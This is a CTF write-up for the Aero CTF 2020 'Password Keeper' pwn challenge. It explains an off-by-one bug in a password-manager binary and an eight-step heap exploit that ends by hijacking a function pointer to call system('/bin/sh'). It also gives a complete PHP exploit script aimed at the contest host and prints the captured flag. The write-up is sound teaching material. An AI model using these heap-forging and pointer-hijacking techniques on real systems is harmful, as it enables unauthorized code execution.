# Password Keeper - Aero CTF 2020 (pwn, 423, 23 solved)
## Introduction

Password Keeper is a pwn task.

An archive containing a binary, a libc and its corresponding loader (`ld.so`).

The binary simulates a password manager in which the user can create, delete and
view passwords. It is only possible to view passwords whose owner match the
current user.

## Reverse engineering

The binary uses two global variables : the user name, stored in an array of 64
chars, and a function pointer that get used to display the user's name. Its
signature is: `void printer(char *user)`.

```c
char username[0x40];
void (*printer)(char *user);
```

The passwords are held in a `char[0x30]`. They are stored in an array of 16
pointers on the stack. This array is followed by an array of 16 characters
called `secret`.

```c
// irrelevant [...]
char *passwords[0x10];
char  secret[0x10];
long  canary;
```

The program keeps track on the number of passwords. It will always allocate the
password to last index. It also verifies that the index is in bound.

```c
if(count < 0x10)
	passwords[count++] = malloc(0x30);
```

The program accepts an index that is between 0 and `count` (inclusive) when
reading a password.

```c
if(0 <= idx && idx <= count)
	if(password[idx] != NULL)
		password_show(password[idx]);
```

The program accepts any integer strictly inferior to `count` when deleting a
password.

```c
if(idx <= count) {
	free(password[idx]);
	password[idx] = NULL;
}
```

Although this construction is vulnerable (`idx` being a signed integer), this
vulnerability has not been exploited. Deleting password at index -1 deletes the
last password added to the manager.

```
{?} Enter password: foobar
-------- Password Keeper --------
[...]
4. Delete password
[...]
> 4
{?} Enter password id: 0
[...]
> 4
{?} Enter password id: -1
free(): double free detected in tcache 2
```

## Exploitation

The vulnerability lies in an off-by-one in both the read and delete features: it
is possible to read and delete one element after the `password` array. This ends
up in the `secret` array that can be controlled by the attacker.

The exploitation can be done by following these steps:
1. put a fake heap chunk in the user name
2. put a fake pointer to `.got.plt` in the `secret` array
3. fill the `password` array
4. read entry 16 to leak `.got.plt` content
5. change secret to point to global user name
6. free fake chunk by deleting entry 16 that points to it
7. allocate a password in `.bss` that overwrites the `printer` function pointer
8. Look at the user's info to call `printer(username)`

The `printer` function can be replaced with `system`. This will run the username
specified in step 1 as a command.

**Flag**: `Aero{a9b57185b3799a0bb4c0bdd01156ae2d5eeea046513a4faf1d51e114df91679e}`

## Appendices

### pwn.php
```php
#!/usr/bin/php
<?php
require_once("Socket.php");

function menu(Tube $t)
{
	$t->expectLine("-------- Password Keeper --------");
	$t->expectLine("1. Keep password");
	$t->expectLine("2. View password");
	$t->expectLine("3. View all passwords");
	$t->expectLine("4. Delete password");
	$t->expectLine("5. Clear all passwords");
	$t->expectLine("6. View profile");
	$t->expectLine("7. Change secret");
	$t->expectLine("8. Exit");
	$t->expect("> ");
}

function add(Tube $t, $pass)
{
	menu($t);
	$t->write("1\n");

	$t->expect("{?} Enter password: ");
	$t->write($pass);
}

function view(Tube $t, $idx)
{
	menu($t);
	$t->write("2\n");

	$t->expect("{?} Enter password id: ");
	$t->write("$idx\n");

	$t->expectLine("---- Password [$idx] ----");
	$t->expect("Value: "); $leak = $t->readLine();
	$t->expect("Owner: "); $t->readLine();

	return $leak;
}

function del(Tube $t, $idx)
{
	menu($t);
	$t->write("4\n");

	$t->expect("{?} Enter password id: ");
	$t->write("$idx\n");
}


function clear(Tube $t)
{
	menu($t);
	$t->write("5\n");
}

function secret(Tube $t, $secret)
{
	menu($t);
	$t->write("7\n");

	$t->expect("Enter new secret: ");
	$t->write($secret);
}


$t = new Socket("tasks.aeroctf.com", 33039);

$user = "/bin/sh\0XeR\0TFNS\0";
$user = str_pad($user, 0x30, "\x00");
$user .= pack("Q*", 0, 0x41);


$t->expect("{?} Enter name: ");
$t->write($user);

$t->expect("{?} Enter secret: ");
$t->write(pack("Q", 0x00403ff0)); // __libc_start_main@got.plt

printf("[*] Create passwords\n");
for($i = 0; $i < 0x10; $i++)
	add($t, $i);

$leak = view($t, 16);
$leak = str_pad(substr($leak, 0, 8), 8, "\x00");
$addr = unpack("Q", $leak)[1];
$libc = $addr - 0x00026ad0;
printf("[+] libc: %X\n", $libc);


printf("[*] Free pointer\n");
secret($t, pack("Q", 0x00404100)); // pointer
del($t, 16);

printf("[*] Get shell\n");
add($t, pack("Q", $libc + 0x00046ed0));
menu($t);
$t->write("6\n");

printf("[+] Pipe\n");
$t->pipe();
```
